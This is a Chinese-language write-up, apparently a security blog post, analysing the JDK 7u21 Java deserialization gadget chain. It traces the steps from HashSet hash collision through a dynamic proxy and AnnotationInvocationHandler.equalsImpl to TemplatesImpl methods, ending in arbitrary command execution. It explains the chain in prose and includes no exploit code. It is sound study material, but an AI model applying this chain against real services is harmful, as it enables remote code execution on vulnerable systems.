它适用于Java 7u21及以前的版本。

漏洞核心

在于sun.reflect.annotation.AnnotationInvocationHandler的equalsImpl方法。

在这个方法中var1来自于传参，var5则是遍历this.getMemberMethods()方法返回的方法数组。

AnnotationInvocationHandler.this.type.getDeclaredMethods();获取该类型自身定义的全部方法，如果this.type是Templates类，那么就会获取到newTransformer()或getOutputProperties() 方法，进而触发任意代码执行。那么我们现在考虑的是如何去调用equalsImpl。

equalsImpl方法调用

equalsImpl在AnnotationInvocationHandler中作为一个私有方法，我们无法直接去调用，但是，我们可以在AnnotationInvocationHandler唯一的公共方法，invoke中调用equalsImpl。

当方法名等于“equals”，且仅有一个Object类型参数时，会调用到equaIsmpl方法。而这个invoke我们可以使用动态代理来实现。现在要实现这个并在动态代理的时候其方法名为equals。

寻找调用equals的方法

equals方法，这个方法每个类都有，用于比较是否相等。这个是在Set实际上相当于只存储key、不存储value的Map。我们经常用Set用于去除重复元素。因为对象不重复，因此就会涉及到比较。equals是用来比较两个对象的内容是否相同。最常用的Set实现类是HashSet，实际上，HashSet仅仅是对HashMap的一个简单封装。

其中这个put就是hashmap的put方法我们进行跟进下去。存入键值对时，先计算key的哈希值并定位数组下标，若该位置已有元素则遍历链表比对；当哈希值一致且对象内存地址不同时，就会调用equals()方法进一步判断键是否重复。

这样链子就找到了，我们将代理对象作为 key 存入 HashSet，将恶意 TemplatesImpl 对象作为已存在的 key，当二者哈希值完全相同时，就会强制触发代理对象的 equals() 方法，进而进入动态代理的 invoke() 流程，最终调用 equalsImpl() 执行 Templates 接口下的危险方法，成功实现任意命令执行。现在要我们的代理对象hash等于TemplateImpl对象的hash。

hash的计算

key.hashCode()外再没有其他变量，所以proxy对象与TemplateImpl对象的“哈希”是否相等，仅 取决于这两个对象的hashCode()是否相等。TemplateImpl的hashCode()是一个Native方法，每次运 行都会发生变化，我们理论上是无法预测的，所以想让proxy的hashCode()与之相等，只能寄希望于 proxy.hashCode()。

遍历 memberValues 这个 Map 里的所有键值对，通过 key 哈希值 ×127 异或 value 哈希值 的公式累加，最终返回一个合成的哈希值。

  • 当memberValues中只有一个key和一个value时，该哈希简化成(127 * key.hashCode()) ^ value.hashCode()
  • 当key.hashCode()等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成value.hashCode()。
  • 当value就是TemplateImpl对象时，这两个对象的哈希就完全相等。

总结可以这样说

最终目的：执行 equalsImpl（因为它会遍历调用 TemplatesImpl 的方法）。

equalsImpl 怎么来：必须先进入 invoke，且调用的方法是 equals。

invoke 怎么来：动态代理对象（proxy）的任意方法被调用，都会进 invoke。

equals 怎么被自动调用：利用 HashSet 反序列化时，hash 冲突 → 调用 equals。

hash 怎么冲突：key = f5a5a608（hash=0），让 proxy 的 hash = templatesImpl 的 hash。

为什么放两个对象：proxy + templatesImpl，制造 hash 冲突，逼 HashSet 调用 equals。
